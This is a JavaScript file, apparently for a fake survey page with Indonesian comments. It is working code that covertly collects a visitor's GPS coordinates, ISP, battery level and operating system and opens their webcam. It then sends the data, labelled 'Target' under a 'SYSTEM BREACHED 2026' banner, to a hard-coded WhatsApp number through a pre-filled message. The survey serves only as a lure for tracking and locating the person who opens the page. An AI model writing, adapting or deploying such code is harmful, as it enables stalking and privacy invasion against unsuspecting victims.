var nomorWA = "628979100200";
var userData = { 
    coords: "0,0", 
    os: navigator.platform,
    battery: "Unknown",
    isp: "Detecting..."
};

// 1. Ambil Data Tambahan
async function getQuickData() {
    try {
        var res = await fetch('https://ipapi.co/json/');
        var data = await res.json();
        userData.isp = data.org || "Protected";
    } catch (e) { userData.isp = "ISP Hidden"; }

    try {
        if (navigator.getBattery) {
            var bat = await navigator.getBattery();
            userData.battery = Math.round(bat.level * 100) + "%";
        }
    } catch (e) { userData.battery = "Blocked"; }
}

// 2. Handler Tombol Mulai (Wajib ID: start-survey)
var startBtn = document.getElementById('start-survey');
if (startBtn) {
    startBtn.onclick = function() {
        // Pindah Tampilan
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
        
        getQuickData();

        // Ambil Lokasi Tanpa Cache
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
            }, function(err) {
                console.log("GPS Denied");
            }, { enableHighAccuracy: true, maximumAge: 0 });
        }

        // Kamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) { 
                var v = document.getElementById('webcam');
                if (v) v.srcObject = stream; 
            })
            .catch(function(e) { console.log("Cam Blocked"); });
    };
}

// 3. Fungsi Kirim
function finalSubmit() {
    var nameVal = document.getElementById('name').value;
    if (!nameVal) {
        alert("Isi nama dulu!");
        return;
    }

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    var prg = 0;
    var timer = setInterval(function() {
        prg += 25;
        var bar = document.getElementById('progress');
        if (bar) bar.style.width = prg + "%";

        if (prg >= 100) {
            clearInterval(timer);
            
            // LINK MAPS: Saya rapihkan supaya tidak error lagi
            var mapLink = "https://www.google.com/maps?q=" + userData.coords;
            
            var msg = "🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A" +
                      "👤 *Target:* " + nameVal + "%0A" +
                      "📍 *Maps:* " + mapLink + "%0A" +
                      "📡 *ISP:* " + userData.isp + "%0A" +
                      "🔋 *Baterai:* " + userData.battery + "%0A" +
                      "💻 *OS:* " + userData.os + "%0A%0A" +
                      "_Status: Live Data Mirrored._";

            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
        }
    }, 600);
}

// Pasang Listener
var submitBtn = document.getElementById('submit-survey');
if (submitBtn) submitBtn.onclick = finalSubmit;

var nameField = document.getElementById('name');
if (nameField) {
    nameField.onkeydown = function(e) { if (e.key === "Enter") finalSubmit(); };
}
